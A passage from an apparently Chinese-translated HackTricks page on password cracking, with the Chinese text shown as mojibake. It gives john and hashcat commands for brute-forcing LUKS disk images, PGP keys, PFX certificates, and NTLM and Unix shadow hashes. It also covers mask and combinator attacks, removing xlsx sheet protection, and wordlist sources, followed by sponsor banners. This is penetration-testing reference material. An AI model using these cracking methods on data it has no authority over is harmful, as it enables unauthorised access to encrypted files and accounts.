#### æ–¹æ³• 1

å®‰è£…ï¼š[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### æ–¹æ³• 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
å¦ä¸€ä¸ªLuks BFæ•™ç¨‹ï¼š[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG ç§é’¥
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### æ€ç§‘

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI ä¸»å¯†é’¥

ä½¿ç”¨ [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) ç„¶åä½¿ç”¨ john

### Open Office å¯†ç ä¿æŠ¤åˆ—

å¦‚æœä½ æœ‰ä¸€ä¸ª xlsx æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€åˆ—è¢«å¯†ç ä¿æŠ¤ï¼Œä½ å¯ä»¥è§£é™¤ä¿æŠ¤ï¼š

* **ä¸Šä¼ åˆ°è°·æ­Œäº‘ç«¯ç¡¬ç›˜**ï¼Œå¯†ç å°†è‡ªåŠ¨è¢«ç§»é™¤
* è¦**æ‰‹åŠ¨ç§»é™¤**å¯†ç ï¼š
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX è¯ä¹¦
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œè¿™äº›å·¥ä½œæµç¨‹ç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å·¥å…·

**å“ˆå¸Œç¤ºä¾‹ï¼š** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### è¯è¡¨

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - å¯†ç **](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **è¯è¡¨ç”Ÿæˆå·¥å…·**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** é«˜çº§é”®ç›˜èµ°ä½ç”Ÿæˆå™¨ï¼Œå¯é…ç½®åŸºç¡€å­—ç¬¦ã€é”®ä½å›¾å’Œè·¯å¾„ã€‚
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John å˜å¼‚

é˜…è¯» _**/etc/john/john.conf**_ å¹¶è¿›è¡Œé…ç½®
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat æ”»å‡»

* **å­—å…¸æ”»å‡»** (`-a 0`) é…åˆè§„åˆ™

**Hashcat** å·²ç»åŒ…å«äº†ä¸€ä¸ª**åŒ…å«è§„åˆ™çš„æ–‡ä»¶å¤¹**ï¼Œä½†ä½ å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°å…¶ä»–æœ‰è¶£çš„è§„åˆ™**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)ã€‚
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Wordlist combinator** æ”»å‡»

å¯ä»¥ä½¿ç”¨hashcatå°†**ä¸¤ä¸ªè¯è¡¨åˆå¹¶æˆä¸€ä¸ª**ã€‚\
å¦‚æœåˆ—è¡¨1åŒ…å«å•è¯ **"hello"** è€Œç¬¬äºŒä¸ªåˆ—è¡¨åŒ…å«ä¸¤è¡Œï¼Œå•è¯åˆ†åˆ«æ˜¯ **"world"** å’Œ **"earth"**ã€‚å°†ä¼šç”Ÿæˆå•è¯ `helloworld` å’Œ `helloearth`ã€‚
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **æ©ç æ”»å‡»** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* å­—å…¸ + æ©ç  (`-a 6`) / æ©ç  + å­—å…¸ (`-a 7`) æ”»å‡»
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat æ¨¡å¼
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
ç ´è§£Linuxå“ˆå¸Œ - /etc/shadowæ–‡ä»¶
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# ç ´è§£Windowså“ˆå¸Œå€¼
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
ç ´è§£å¸¸è§åº”ç”¨ç¨‹åºå“ˆå¸Œ
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* å¦‚æœæ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œï¼Œæƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…æƒ³è¦è·å–**PEASSæœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—ã€‚
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricksä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloudä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
